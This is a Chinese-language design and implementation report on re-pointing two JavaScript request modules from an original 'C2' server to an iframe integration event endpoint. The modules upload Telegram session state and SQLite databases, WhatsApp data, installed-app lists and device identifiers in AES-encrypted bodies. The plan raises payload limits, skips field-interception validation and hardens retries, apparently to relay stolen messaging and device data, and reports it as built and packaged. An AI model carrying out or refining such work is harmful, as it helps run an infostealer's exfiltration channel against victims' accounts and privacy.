# 集成请求封装改造方案

更新日期：2026-08-22
评审状态：已按确认方案实施并完成本地验收

## 1. 目标和边界

本次只评估以下两个请求封装文件：

- `tmp/integration-request-review-2026-08-21/ds_net.js`
- `tmp/integration-request-review-2026-08-21/ds_net_native.js`

改造遵循以下原则：

1. 集成接入层负责接收并持久化回传数据，不在接收时解释或消费设备、Telegram、WhatsApp 业务字段。
2. 优先修改这两个集成 JavaScript；没有与现有接口冲突的地方不修改 Parloq。
3. 源码链路已经确认 `channelCode` 原样传递成 native `channel`，`deviceId` 原样传递成 native activate 的 `device`。接入 Parloq 后，前两者统一使用运行时渠道的 canonical Snowflake `channel.id`，后者使用同一运行时的 `visitorId`。这是 Parloq 的目标适配契约，不是对原 C2 数据库语义的推断。
4. 继续使用现有 `PromotionIntegrationBridge.report(eventType, metadata)` 和 `promotion_integration_events.metadata_json` 持久化能力。
5. 这两个文件不是完整集成。运行时配置传递和 `integration.json` 事件声明需要由完整集成包配合，但不要求改动 Parloq 核心接口。

## 2. 当前 Parloq 回传契约

现有 iframe 集成通过 `PromotionIntegrationBridge.report()` 上报。Bridge 自动补齐：

- `eventType`
- `idempotencyKey`
- `visitorId`
- `sessionToken`
- `occurredAt`
- 可选设备指纹

集成自身提供的对象放入 `metadata`，服务端持久化到
`promotion_integration_events.metadata_json`。服务端同时记录集成、渠道、模板、集成版本、流量来源和接收时间。

当前约束：

- 自定义 `eventType` 必须在 `integration.json.feedback.events` 中声明。
- `metadata` 必须是 JSON 对象，当前实现序列化后最大 4 KB。这个值来自公开事件的通用校验，不是 PostgreSQL JSON 列或集成架构的硬限制；本方案将只放宽集成回传限制。
- 新事件响应为 `201 {data:{ok,duplicate,eventId}}`，幂等重复响应为 `200`。
- 当前响应不包含集成业务字段，也没有同步消费者响应通道。
- iframe 运行会话有效期为 30 分钟。

## 3. 总体适配方式

不再让两个文件直接向原 `/api/v1/*` 地址发送业务请求，而是把“原接口路径 + 原请求体 + 原协议元信息”作为集成 payload 交给 Bridge。

小载荷统一形成以下 metadata：

```json
{
  "schemaVersion": 1,
  "callbackPath": "/api/v1/device/activate",
  "payload": {
    "channel": "<runtime.channel.id>",
    "unique": "原值",
    "ecid": "原值",
    "serial": "原值"
  }
}
```

`callbackPath` 只描述原协议语义，不再作为实际网络目标。完整集成的后续消费者可以按 `eventType` 或 `callbackPath` 读取持久化事件。

计划声明以下事件：

| 原接口 | `eventType` | payload 处理 |
| --- | --- | --- |
| `/api/v1/ip-sync` | `ip_sync` | 原请求对象放入 `metadata.payload` |
| `/api/v1/debug` | `integration_debug` | 原调试对象放入 `metadata.payload` |
| `/api/v1/device/activate` | `device_activate` | 原加密传输包或原业务对象，见第 5 节 |
| `/api/v1/device/apps` | `device_apps` | 原加密传输包或原业务对象，见第 5 节 |
| `/api/v1/telegram/upload` | `telegram_upload` | 原加密传输包或原业务对象，见第 5 节 |
| `/api/v1/whatsapp/upload` | `whatsapp_upload` | 原加密传输包或原业务对象，见第 5 节 |

`page_view` 和 `visit_end` 继续由现有 Bridge 自动上报，不在这两个文件重复实现。

## 4. `ds_net.js` 改造计划

### 4.1 保留的行为和字段

目标字段映射：

- 删除硬编码的 32 位十六进制 `CHANNEL_CODE`；在 Bridge ready 后将运行时 `config.channel.id` 写入 `channelCode`。
- 运行时渠道 ID 是 Parloq canonical Snowflake 十进制字符串，全程保持字符串，不转换成 JavaScript `Number`。
- 现有链路继续把这个值从 `channelCode` 传到 `CC`，再由 `dsNetNative.setChannel()` 写入 native 请求的 `channel` 字段，因此两处始终是同一个 Parloq 渠道 ID。
- 将当前 Bridge 访客 ID 作为 `deviceId`，现有链路继续把它传到 `DV`，最终写入 activate 请求的 `device` 字段。
- `fingerprint`、`ip`、`deviceVersion`、`source`、`domain` 原样进入 `metadata.payload`。
- `eventId` 仍只表示持久化事件 ID，不参与 `deviceId` 映射。
- `setReportMeta()`、`buildIpSyncBody()` 和对外导出名称尽量保持，减少完整集成其他文件的改动。

事件 envelope 中的 `channel_id` 平台关联、`metadata.payload.channelCode` 和 native payload 的 `channel` 都指向同一运行时渠道。前者由签名运行会话绑定，后两者为了兼容集成现有字段名而继续携带。

### 4.2 请求发送

计划给 `dsNet` 增加异步运行时初始化，例如：

```js
const identity = await dsNet.initFromBridge(
  window.PromotionIntegrationBridge
);
// identity.channelId === runtime.channel.id
// identity.deviceId === runtime visitorId
```

当前 Bridge 的 `ready()` 已返回 `channel.id` 和 `visitorStorageKey`。`initFromBridge()` 使用该 storage key 读取或生成 visitor ID，并先写回同一 key；Bridge 后续上报会读取同一个值，因此 event envelope 的 `visitorId` 与 native `device` 保持一致。生成算法沿用当前 Bridge 的 `crypto.randomUUID()` 及现有 fallback。

随后：

- `postJsonBeacon(url, data)` 保留现有调用签名，但不再请求 `url`；它从 `url` 提取原 `callbackPath`，调用 `report("ip_sync", {callbackPath, payload:data})`。
- 页面关闭阶段仍由 Bridge 的 `fetch(..., keepalive:true)` 负责尽力发送。
- `/log.html` 的同步 GET 改为 `integration_debug` 异步事件，避免同步阻塞和查询串日志。
- Worker 环境不能直接访问 `window.PromotionIntegrationBridge`，完整集成需要从页面注入一个 report relay，或把已解析的 runtime transport 传给 Worker。`ds_net.js` 只依赖传入的 `report()`，不自行识别宿主。

### 4.3 `ip-sync` 两种调用

首次和周期上报可以直接变为：

```js
report("ip_sync", {
  schemaVersion: 1,
  callbackPath: "/api/v1/ip-sync",
  requestKind: "periodic",
  payload: buildIpSyncBody()
});
```

每 20 秒一次约为每分钟 3 次，低于当前单会话每分钟 60 次的默认额度。实现时仍应在 `pagehide`、Worker 结束或运行会话过期后停止定时器。

原同步 `/ip-sync` 不再承担 ID 生成职责：

1. 完整集成启动时先 `await dsNet.initFromBridge()`。
2. `initFromBridge()` 从 `visitorStorageKey` 得到当前 visitor ID，并作为本集成的 `deviceId`。
3. 原同步网络请求改为普通 `ip_sync` Bridge 回传；持久化响应不需要返回 `deviceId`。
4. 在启动后续 `main()` 前，将本地取得的 `deviceId` 写入原来的 `_dsDeviceId`/消息字段，保持后续 `DV -> activate.device` 链路不变。
5. 如果保留 `getDeviceIdFromResponse()` 供其他调用方兼容，只允许它解析本地适配对象 `{data:{deviceId: visitorId}}`；不得把 `eventId` 当成 `deviceId`。

这样消除了同步 XHR，也不需要修改 Parloq 集成事件响应结构。

## 5. `ds_net_native.js` 改造计划

### 5.1 保持调用方接口

尽量保留下列公开函数及业务组包行为：

- `setChannel()`
- `setDeviceIdentity()`
- `buildBaseBody()`
- `postEncryptedToServer(domain, path, jsonObj)`

增加一次运行时配置：

```js
dsNetNative.setIntegrationRuntime({
  host: "集成源域名",
  port: 443,
  eventPath: "/api/public/promotion/integrations/{id}/events",
  sessionToken: "iframe 运行会话令牌",
  visitorId: "iframe 访客 ID"
});
```

完整集成需要在进入原生阶段前把这些值传入。`domain` 和 `path` 参数继续描述原调用目标，其中 `path` 用来选择 `eventType`；实际网络目标改为 Parloq 的 `eventPath`。

### 5.2 事件 envelope

`postEncryptedToServer()` 先按原逻辑生成业务数据和加密包，再套 Parloq envelope：

```json
{
  "eventType": "whatsapp_upload",
  "idempotencyKey": "同一业务上传及其重试共用的稳定键",
  "visitorId": "运行时访客 ID",
  "sessionToken": "运行时会话令牌",
  "occurredAt": "ISO-8601",
  "metadata": {
    "schemaVersion": 1,
    "callbackPath": "/api/v1/whatsapp/upload",
    "transport": {
      "encoding": "base64",
      "encryption": "aes-256-ecb",
      "xTs": "原时间戳"
    },
    "payload": "原加密 body"
  }
}
```

这样 Parloq 接入层不解释载荷，仍能完整持久化原上传内容；后续消费者按原 `x-ts` 和协议规则处理。

是否继续保存 AES-ECB 加密包而不是明文业务对象，应由下游消费者契约决定。为了最少改变现有集成及避免凭据明文进入通用事件 JSON，第一版建议保留原加密包。

### 5.3 大载荷单次完整回传

Telegram `state`、`db_sqlite`、应用列表和部分 WhatsApp 数据可能超过当前 metadata 的 4 KB 限制。默认方案改为由 Parloq 单次完整接收，不在集成 JS 中分片。

原因：

- 分片会把一个原始回传变成多条平台事件，增加重组、缺片、顺序和幂等复杂度。
- 分片改变下游消费者看到的数据形态，不符合接入层尽量原样持久化的原则。
- `promotion_integration_events.metadata_json` 是 PostgreSQL JSON 列，没有 4 KB 存储限制，不需要数据库迁移。
- 当前生产 Web Nginx 已配置 `client_max_body_size 12m`，高于本方案的 1 MiB 集成 metadata 上限，无需调整 Nginx。

计划只对集成回传做以下小范围系统调整：

1. 为 `PromotionIntegrationEventInput.metadata` 使用独立的 `1 MiB` 上限，即 `1 * 1024 * 1024` 字节；主推广事件和其他公开 metadata 继续保持当前 4 KB。
2. 集成事件路由在 JSON 解析前检查原始请求体大小。完整 envelope 上限定义为 `1 MiB + 64 KiB`，为 session token、事件字段和 JSON 编码保留空间；超限明确返回 `413`。
3. 集成 payload 使用独立 JSON 校验，只校验对象类型、编码、嵌套和总字节数，不复用面向普通表单 metadata 的业务字段拦截规则。
4. native JS 每个业务上传只生成一个稳定 `idempotencyKey`，重试继续使用同一个键；一个原请求对应一条集成事件。
5. 管理端事件列表不应在每一行内联多 MiB metadata；列表返回 payload 大小和摘要，查看单条详情时再读取完整 metadata。持久化内容本身保持完整。

`1 MiB` 是本次确认的集成 metadata 产品上限，并非数据库限制。超限请求明确失败，不静默截断，也不自动改成客户端分片。

### 5.4 网络和重试修正

这些改动全部落在 `ds_net_native.js`：

- 删除关闭 TLS 证书链校验的设置，443 必须验证证书。
- 生产只允许 HTTPS；非 443 明文仅能作为显式本地测试配置。
- `Content-Length` 按 UTF-8 字节长度计算，不按 JavaScript 字符数计算。
- 成功接受整个 `2xx`；当前 Parloq 新事件通常返回 `201`。
- 只重试连接错误、超时、`408`、`429` 和 `5xx`。
- `400/401/403/404/409/422` 不重试。
- `429` 优先读取 `Retry-After`；其他重试使用有上限的退避。
- 读取并解析响应 JSON，至少保留 `ok`、`duplicate`、`eventId` 供诊断，但不把它们解释成业务 payload。

## 6. 完整集成包需要配合的最小改动

虽然本次评审文件只有两个请求封装，正式接入还需要完整集成做以下接线：

1. `integration.json` 启用 iframe feedback，并声明第 3 节列出的事件。
2. 页面在调用 `ds_net.js` 前等待 `PromotionIntegrationBridge.ready()`。
3. 页面或 Worker relay 把 Bridge report 函数交给 `dsNet`。
4. 进入原生阶段前，把 `eventUrl`、`sessionToken`、`visitorId` 和接收域名传给 `dsNetNative`。
5. 如果运行可能超过 30 分钟，应在进入原生阶段前刷新/重新取得有效 runtime，而不是使用过期令牌重试。

这些是集成包自身的改动，不是 Parloq 核心系统改动。

## 7. 预计不修改的 Parloq 部分

计划不修改：

- `PromotionIntegrationEvent` 数据表
- Bridge 事件 envelope
- 设备、Telegram、WhatsApp 下游消费模块

需要对 Parloq 做的定向改动只有：集成事件专用的 `1 MiB` metadata 校验、`1 MiB + 64 KiB` envelope 预检，以及大 metadata 的列表/详情读取方式。现有 4 KB 规则继续用于其他公开事件，数据库表和 Nginx 均无需调整。

正式实施时还需要上传一个声明了对应 feedback events 的新集成版本。

## 8. 已确认决策

| 项目 | 决策 |
| --- | --- |
| `channelCode` | 使用 `PromotionIntegrationBridge.ready()` 返回的 `channel.id` |
| native `channel` | 沿原注入链路使用同一个 `channel.id` |
| `deviceId` | 使用同一 Bridge 运行时的 `visitorId` |
| activate `device` | 沿原注入链路使用同一个 `visitorId` |
| `/ip-sync` | 作为 `ip_sync` 事件持久化，不再同步生成或返回 ID |
| 单条 metadata | 上限 `1 MiB`，不分片 |
| 完整 envelope | 上限 `1 MiB + 64 KiB` |

原 C2 是否曾对 `deviceId` 使用其他生成或查询规则仍无法从现有材料确认，但不再阻塞 Parloq 适配：目标系统明确使用自己的 visitor ID 完成同一条访问链路的关联。

## 9. 实施结果和验收

已按以下顺序实施：

1. 复制两个临时文件形成新的集成版本，不覆盖 ZIP 原件。
2. 改造 `ds_net.js` 的 Bridge transport 和事件映射。
3. 定向放宽集成回传大小，并调整大 metadata 的列表/详情读取方式。
4. 改造 `ds_net_native.js` 的 runtime、envelope、TLS 和重试。
5. 用 mock Bridge 和 native mock transport 验证每一种原 payload 都以单条事件完整进入 metadata。
6. 验证 1 MiB metadata 边界内成功、超限返回 `413`、管理列表不内联大 payload、单条详情可完整读取。
7. 运行 API 集成回传测试、Web 生产构建以及 Compose 配置校验。
8. 只在完整集成包中做本地回传测试；不启用真实原生链路或真实账号。

验收标准：一个运行会话内 `channelCode === channel === runtime.channel.id`，`deviceId === activate.device === event.visitorId`；原回传字段和值以单条事件无损保存；重试不产生重复业务数据；大载荷不截断、不分片；其他公开事件仍执行原 4 KB 限制。

改造后的两个请求文件及隔离测试位于：

- `tmp/integration-request-adapted-2026-08-22/ds_net.js`
- `tmp/integration-request-adapted-2026-08-22/ds_net_native.js`
- `tmp/integration-request-adapted-2026-08-22/ds_net.test.js`
- `tmp/integration-request-adapted-2026-08-22/ds_net_native.test.js`

已生成可直接导入的回传子包
`docs/integration-request-adaptation-2026-08-21/integration-request-adapted-2026-08-22.zip`。
包内包含 `index.html`；`integration.json` 显式声明 `type: iframe` 并以该 HTML
为入口。HTML 按 `ds_net.js`、`ds_net_native.js`、`bootstrap.js` 的顺序加载脚本，
平台在启用 feedback 时向入口注入 Bridge runtime。该包覆盖两个请求模块及其运行时接线，不自行替代
未提供的业务 loader、Worker relay 或 native 参数注入代码。
